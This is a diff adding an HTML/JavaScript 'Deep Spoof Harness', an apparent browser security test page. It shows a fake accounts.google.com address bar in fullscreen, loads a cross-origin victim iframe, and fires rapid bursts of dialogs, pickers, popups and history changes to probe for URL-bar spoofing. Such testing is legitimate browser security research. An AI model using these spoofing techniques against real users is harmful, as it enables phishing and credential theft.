@@ -1,1 +1,179 @@
-<iframe src="https://victimjodyritonga-create.github.io/victim/"></iframe>
+<!doctype html>
+<html lang="en">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Deep Spoof Harness - Attacker</title>
+<style>
+  body { font-family: ui-sans-serif, system-ui, sans-serif; margin: 14px; }
+  .row { display: flex; gap: 8px; margin-bottom: 8px; flex-wrap: wrap; }
+  button { padding: 8px 10px; }
+  #fakebar { position: fixed; top: 0; left: 0; right: 0; height: 50px; background: #f1f3f4; border-bottom: 1px solid #d0d0d0; display: none; align-items: center; padding: 0 10px; z-index: 999999; }
+  #chip { background: #fff; border: 1px solid #ccc; border-radius: 14px; padding: 6px 10px; width: min(720px, 90vw); overflow: hidden; white-space: nowrap; text-overflow: ellipsis; }
+  #frameWrap { margin-top: 58px; border: 2px solid #222; height: 56vh; overflow: hidden; position: relative; }
+  iframe { width: 100%; height: 100%; border: 0; }
+  pre { background: #101217; color: #d7dde7; padding: 10px; height: 28vh; overflow: auto; border-radius: 6px; }
+</style>
+<div id="fakebar"><div id="chip">https://accounts.google.com/</div></div>
+<h1>Deep Spoof Harness</h1>
+<div>Origin: <code id="origin"></code></div>
+<div class="row">
+  <button id="loadVictim">Load cross-origin victim iframe</button>
+  <button id="enterFs">Enter fullscreen</button>
+  <button id="exitFs">Exit fullscreen</button>
+  <button id="pickerBurst">Picker burst</button>
+  <button id="dialogBurst">Dialog burst</button>
+  <button id="dialogElemBurst">Dialog element burst</button>
+  <button id="popupBurst">Popup burst</button>
+  <button id="historyRace">History race</button>
+  <button id="visibilityRace">Visibility race</button>
+  <button id="clearLog">Clear log</button>
+</div>
+<div id="frameWrap"><iframe id="victim" src="about:blank"></iframe></div>
+<pre id="log"></pre>
+<script>
+(() => {
+  const $ = (id) => document.getElementById(id);
+  const logEl = $('log');
+  const victim = $('victim');
+  const fake = $('fakebar');
+  const originEl = $('origin');
+  const state = { seq: 0 };
+
+  const q = new URLSearchParams(location.search);
+  const victimOrigin = q.get('victimOrigin') || 'https://victimjodyritonga-create.github.io/victim/';
+  const victimPath = q.get('victimPath') || 'victim.html';
+
+  originEl.textContent = location.origin;
+
+  const stamp = () => new Date().toISOString().slice(11, 23);
+  const line = (s) => `${++state.seq}\t${stamp()}\t${s}`;
+  const log = (s) => { logEl.textContent += line(s) + '\n'; logEl.scrollTop = logEl.scrollHeight; };
+
+  window.addEventListener('message', (e) => {
+    if (typeof e.data === 'object' && e.data && e.data.kind === 'victim') {
+      log(`victim-msg origin=${e.origin} data=${JSON.stringify(e.data)}`);
+      return;
+    }
+    log(`message origin=${e.origin} dataType=${typeof e.data}`);
+  });
+
+  document.addEventListener('fullscreenchange', () => {
+    log(`fullscreenchange fs=${!!document.fullscreenElement}`);
+    fake.style.display = document.fullscreenElement ? 'flex' : 'none';
+  });
+  document.addEventListener('visibilitychange', () => log(`visibility=${document.visibilityState}`));
+  window.addEventListener('blur', () => log('window.blur'));
+  window.addEventListener('focus', () => log('window.focus'));
+  window.addEventListener('pageshow', () => log('pageshow'));
+
+  $('loadVictim').onclick = () => {
+    const url = `${victimOrigin}${victimPath}`;
+    victim.src = url;
+    log(`victim-load ${url}`);
+  };
+
+  $('enterFs').onclick = async () => {
+    try {
+      await document.documentElement.requestFullscreen();
+      log('enter-fs ok');
+    } catch (e) {
+      log(`enter-fs err ${String(e).slice(0,120)}`);
+    }
+  };
+
+  $('exitFs').onclick = async () => {
+    try {
+      if (document.fullscreenElement) await document.exitFullscreen();
+      log('exit-fs ok');
+    } catch (e) {
+      log(`exit-fs err ${String(e).slice(0,120)}`);
+    }
+  };
+
+  $('pickerBurst').onclick = () => {
+    const sel = document.createElement('select');
+    sel.innerHTML = '<option>a</option><option>b</option>';
+    sel.style.position = 'fixed';
+    sel.style.left = '8px';
+    sel.style.bottom = '8px';
+    document.body.appendChild(sel);
+    let ok = 0, err = 0, i = 0;
+    const t = setInterval(() => {
+      i++;
+      try {
+        if (sel.showPicker) { sel.showPicker(); ok++; } else { err++; }
+      } catch (_) { err++; }
+      if (i % 4 === 0) history.replaceState({}, '', '/chrome-spoof-lab/deep/run/' + i);
+      if (i >= 40) { clearInterval(t); log(`pickerBurst done ok=${ok} err=${err} path=${location.pathname}`); }
+    }, 120);
+    log('pickerBurst start');
+  };
+
+  $('dialogBurst').onclick = () => {
+    let i = 0;
+    log('dialogBurst start');
+    const t = setInterval(() => {
+      i++;
+      try { alert('dialog #' + i); } catch (_) {}
+      if (i % 3 === 0) history.replaceState({}, '', '/chrome-spoof-lab/deep/dialog/' + i);
+      if (i >= 5) { clearInterval(t); log('dialogBurst done'); }
+    }, 240);
+  };
+
+  $('dialogElemBurst').onclick = () => {
+    log('dialogElemBurst start');
+    const d = document.createElement('dialog');
+    d.innerHTML = '<p>Transient dialog element</p><button id="x">Close</button>';
+    document.body.appendChild(d);
+    let i = 0;
+    const t = setInterval(() => {
+      i++;
+      try { if (!d.open) d.showModal(); } catch (_) {}
+      if (i % 2 === 0) {
+        try { d.close(); } catch (_) {}
+      }
+      if (i % 3 === 0) history.replaceState({}, '', '/chrome-spoof-lab/deep/delem/' + i);
+      if (i >= 24) {
+        clearInterval(t);
+        try { d.close(); } catch (_) {}
+        d.remove();
+        log('dialogElemBurst done path=' + location.pathname);
+      }
+    }, 120);
+  };
+
+  $('popupBurst').onclick = () => {
+    log('popupBurst start');
+    const wins = [];
+    for (let i = 0; i < 3; i++) {
+      const w = window.open('about:blank', '_blank', 'noopener,noreferrer,width=240,height=180');
+      wins.push(!!w);
+    }
+    log('popupBurst opened=' + JSON.stringify(wins));
+  };
+
+  $('historyRace').onclick = () => {
+    log('historyRace start');
+    let i = 0;
+    const t = setInterval(() => {
+      i++;
+      history.pushState({}, '', '/chrome-spoof-lab/deep/h/' + i);
+      if (i % 3 === 0) history.back();
+      if (i >= 24) { clearInterval(t); log('historyRace done path=' + location.pathname); }
+    }, 80);
+  };
+
+  $('visibilityRace').onclick = () => {
+    log('visibilityRace start');
+    const w = window.open('about:blank', '_blank', 'width=320,height=240');
+    setTimeout(() => {
+      try { w && w.close(); } catch (_) {}
+      log('visibilityRace done');
+    }, 1500);
+  };
+
+  $('clearLog').onclick = () => { logEl.textContent = ''; state.seq = 0; log('log cleared'); };
+  log('harness ready');
+})();
+</script>
+</html>
